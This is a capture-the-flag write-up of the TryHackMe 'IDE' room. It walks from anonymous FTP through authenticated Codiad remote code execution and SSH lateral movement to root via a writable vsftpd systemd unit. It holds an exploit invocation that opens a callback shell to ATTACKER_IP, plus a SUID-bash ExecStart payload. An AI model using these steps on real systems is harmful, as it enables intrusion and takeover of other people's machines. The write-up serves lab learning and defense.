---
title: "TryHackMe: IDE"
date: 2025-12-28 02:12:56 +0100
categories: [TryHackMe]
tags:
  - linux
  - ftp
  - ssh
  - web
  - codiad
  - rce
  - systemd
  - sudo
  - privilege-escalation
description: >-
  IDE chains anonymous FTP disclosure, authenticated Codiad remote code
  execution, local credential discovery, and writable systemd service abuse
  into complete root compromise.
author: lenovolegion7
media_subpath: /images/tryhackme_ide
image:
  path: room_image.webp
  alt: "Original TryHackMe IDE room artwork"
toc: true
comments: false
---

IDE is a Linux web-to-root challenge built around weak anonymous file exposure, an authenticated Codiad code-execution path, local credential reuse, and an unsafe privilege boundary around the `vsftpd` systemd unit. The validated path moved from anonymous FTP to the Codiad 2.8.4 interface, gained an initial shell as `www-data`, pivoted to `drac` over SSH, and then reached root by combining a writable service definition with sudo permission to restart that service.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe IDE room card](room_card.webp){: w="294" h="268" .shadow }](https://tryhackme.com/room/ide){: .center }

## Executive Summary

The target exposed four relevant TCP services during enumeration:

```text
21/tcp     FTP    vsftpd 3.0.3
22/tcp     SSH    OpenSSH 7.6p1
80/tcp     HTTP   Apache 2.4.29
62337/tcp  HTTP   Apache 2.4.29 / Codiad 2.8.4
```

The ordinary web service on TCP/80 presented the default Apache page and did not reveal a useful content path during directory enumeration. A follow-up full-range TCP scan exposed TCP/62337, where Codiad 2.8.4 was reachable.

Anonymous FTP access then provided the key credential clue. A hidden directory contained a hidden file with a note indicating that the `john` account had been reset to a default credential. That information enabled authentication to Codiad, after which an authenticated remote-code-execution exploit produced a shell as `www-data`.

Local enumeration exposed the credential for `drac`. SSH provided a stable shell in that account, and sudo enumeration showed that `drac` could restart `vsftpd` as root. Because `/lib/systemd/system/vsftpd.service` was writable by the `drac` group, the service unit could be hijacked so that a privileged restart created a SUID Bash copy. Executing that binary with preserved privileges yielded root.

> **Result:** An unauthenticated network user was able to progress from anonymous FTP access to complete root compromise.
{: .prompt-danger }

## Scope and Safety Context

This assessment was performed against the authorized TryHackMe IDE laboratory target.

Target and attacker addressing, clear-text credentials, and challenge proof values are not published. Commands below therefore use `TARGET_IP`, `ATTACKER_IP`, `[REDACTED]`, and `THM{[REDACTED]}` where required.

## Validated Attack Path

1. **Service discovery** — Scan the target and identify FTP, SSH, and the default Apache service.
2. **Full TCP enumeration** — Scan the complete TCP port range and identify the additional HTTP service on TCP/62337.
3. **Codiad discovery** — Browse TCP/62337 and identify Codiad 2.8.4 behind a login panel.
4. **Exploit research** — Search locally available exploit references and identify authenticated remote-code-execution options for the installed Codiad version.
5. **Anonymous FTP enumeration** — Log in anonymously, reveal a hidden directory and file, and recover the credential clue for `john`.
6. **Codiad authentication** — Sign in to the IDE as `john:[REDACTED]`.
7. **Initial code execution** — Run the authenticated Codiad exploit and receive a callback shell as `www-data`.
8. **Credential discovery** — Enumerate the host and recover the credential for `drac` from locally readable data.
9. **SSH lateral movement** — Authenticate as `drac` and obtain a stable interactive shell.
10. **User objective** — Read `/home/drac/user.txt` and record the redacted objective.
11. **Sudo enumeration** — Confirm that `drac` can restart the `vsftpd` service with root privileges.
12. **Service-file abuse** — Identify `/lib/systemd/system/vsftpd.service` as writable by the `drac` group and replace its `ExecStart` action with the validated privilege-escalation payload.
13. **Privileged restart** — Reload systemd and restart `vsftpd` through the permitted sudo command.
14. **Root shell** — Execute the created SUID Bash copy with preserved privileges.
15. **Root objective** — Read `/root/root.txt` and record the redacted objective.

## Initial Enumeration

Initial service discovery used Nmap with version detection and aggressive enumeration:

```console
$ sudo nmap -Pn -sSV -A TARGET_IP
```

The first pass exposed the expected public-facing services:

```text
21/tcp  FTP   vsftpd 3.0.3
22/tcp  SSH   OpenSSH 7.6p1
80/tcp  HTTP  Apache 2.4.29
```

TCP/21 allowed anonymous FTP authentication. TCP/22 exposed SSH for remote administration. TCP/80 returned the default Apache page and did not immediately expose application functionality.

### HTTP enumeration on TCP/80

A directory scan was attempted against the default web service:

```console
$ ffuf \
  -w /usr/share/wordlists/dirb/big.txt \
  -u http://TARGET_IP/FUZZ
```

This scan did not identify a useful route on TCP/80. Rather than continue focusing on the default site, enumeration returned to the network layer.

### Full TCP port scan

A complete TCP scan identified an additional listening service:

```console
$ sudo nmap -Pn -sS -vvv -p- TARGET_IP
```

The additional port was:

```text
62337/tcp  HTTP
```

Browsing the service revealed a Codiad login panel running version 2.8.4.

## Codiad Discovery and Exploit Research

Codiad is a browser-based development environment, so the exposed login panel represented a substantially more interesting attack surface than the default Apache page.

Local exploit research was performed against the observed version:

```console
$ searchsploit "codiad 2.8.4"
```

The available exploit references included authenticated remote-code-execution techniques. This meant the remaining requirement was a valid Codiad account.

The public report records this step at the version-and-technique level as authenticated remote code execution against Codiad 2.8.4.

## Anonymous FTP Enumeration

The FTP service allowed anonymous authentication:

```console
$ ftp TARGET_IP
```

After connecting, hidden entries were enumerated:

```console
ftp> ls -la
ftp> cd ...
ftp> get ./-
```

The hidden directory `...` contained a hidden file named `-`. The file held a note from `drac` to `john` indicating that the `john` account had been reset to the default credential.

The clear-text value is not published. The useful outcome was the account-and-credential combination required for the Codiad login:

```text
john:[REDACTED]
```

This converted an information-disclosure issue on FTP into authenticated access to the web IDE.

## Authenticated Codiad Remote Code Execution

Authentication to Codiad 2.8.4 succeeded as `john`.

The validated exploitation path used a Python exploit script against the authenticated application. With sensitive values redacted, the invocation took the following form:

```console
$ python3 exploit.py \
  http://TARGET_IP:62337/ \
  john \
  [REDACTED] \
  ATTACKER_IP \
  1234 \
  linux
```

The exploit triggered the documented callback workflow and produced an initial host shell.

The resulting execution context was:

```text
www-data
```

This established the first operating-system foothold. The callback shell was subsequently stabilized for local enumeration.

## Lateral Movement to `drac`

Local enumeration from the `www-data` context identified the local user `drac` and exposed a readable credential source containing the credential associated with that account.

The public report records the account only as:

```text
drac:[REDACTED]
```

Using that credential over SSH produced a stable shell as `drac`.

The first challenge objective was located at:

```text
/home/drac/user.txt
```

and is published only as:

```text
THM{[REDACTED]}
```

The exact filename or command used to retrieve the `drac` credential is not preserved consistently enough in the supplied evidence to publish as a validated step.

## Sudo and Service Permission Enumeration

Privilege escalation began with sudo enumeration:

```console
$ sudo -l
```

The important permission was the ability to restart `vsftpd` with root privileges.

The corresponding unit file was:

```text
/lib/systemd/system/vsftpd.service
```

Permission review showed that this service definition was writable by the `drac` group.

That combination created a direct privilege boundary failure:

1. `drac` could modify the service command executed by systemd;
2. `drac` could trigger a privileged restart of the same service;
3. the modified command would therefore execute as root.

## Privilege Escalation via `vsftpd.service`

The validated service-hijacking payload replaced the service `ExecStart` action with a command that copied Bash into `/tmp` and added the SUID bit:

```text
ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```

Systemd was then instructed to reload the modified unit definition, followed by the permitted privileged service restart:

```console
$ systemctl daemon-reload
$ sudo /usr/sbin/service vsftpd restart
```

The service restart executed the modified `ExecStart` action as root and created:

```text
/tmp/rootbash
```

The SUID copy was executed while preserving the effective privilege context:

```console
$ /tmp/rootbash -p
```

The resulting shell had root privileges.

The final objective was located at:

```text
/root/root.txt
```

and is published only as:

```text
THM{[REDACTED]}
```

## Findings

### F-01 - Writable systemd Service Definition

- **Severity:** Critical
- **Affected file:** `/lib/systemd/system/vsftpd.service`
- **Affected account:** `drac`
- **Impact:** immediate privilege escalation to root

The `vsftpd` service definition was writable by the `drac` group while the same user could restart the service with root privileges. Modifying `ExecStart` therefore converted a legitimate administrative action into attacker-controlled root code execution.

### F-02 - Authenticated Codiad Remote Code Execution

- **Severity:** High
- **Affected service:** Codiad 2.8.4 on TCP/62337
- **Impact:** remote code execution as `www-data`

Once a valid Codiad account was available, the authenticated application could be exploited to execute code and establish the initial operating-system shell.

### F-03 - Anonymous FTP Credential Disclosure

- **Severity:** High
- **Affected service:** vsftpd 3.0.3 on TCP/21
- **Impact:** credential harvesting leading to Codiad access

Anonymous FTP exposed a hidden note containing the clue required to recover a working credential for `john`. That disclosure enabled access to the authenticated attack surface on TCP/62337.

## Security Impact

The validated chain resulted in complete root compromise from an unauthenticated remote starting position.

An attacker with equivalent access could progress through distinct trust boundaries:

- anonymous access to FTP-hosted data;
- authenticated access to the Codiad development environment;
- remote code execution as the web-service account;
- lateral movement to the local `drac` account;
- privileged service manipulation;
- arbitrary root-level command execution;
- access to both user- and root-level challenge objectives.

The most severe condition was not any single exposed service in isolation, but the way the weaknesses chained together. Anonymous information disclosure supplied the credential needed for application exploitation, and the local service-permission error then collapsed the final root boundary.

## Objective Validation

Both challenge objectives were recovered during the assessment:

```text
/home/drac/user.txt  -> THM{[REDACTED]}
/root/root.txt       -> THM{[REDACTED]}
```

No proof values are included in the public report.

## Evidence Limitations

This public report is limited to the attack path supported by the supplied assessment materials. In particular:

- raw Nmap output was not preserved in the private report;
- the TCP/80 directory enumeration did not produce a relevant finding;
- the exploit source code and complete callback transcript are not included;
- the exact local filename used to recover the `drac` credential is not consistently documented;
- service restoration and removal of `/tmp/rootbash` are not documented as completed cleanup actions;
- remediation implementation and retest evidence are not present.

Accordingly, this report does not claim cleanup completion or successful remediation validation.

## Lessons Learned

IDE demonstrates how small weaknesses in separate layers can become a complete compromise chain when the trust boundaries between them are weak.

Anonymous FTP provided the credential clue. The credential unlocked an authenticated code-execution path in the web IDE. Local credential exposure enabled the move to a more privileged user, and the combination of a writable systemd unit with sudo-controlled service restart converted that local access directly into root execution.

The key lesson from the validated path is that service exposure, credential handling, application privilege, filesystem permissions, and sudo rights must be reviewed as one connected attack surface rather than as isolated configuration items.
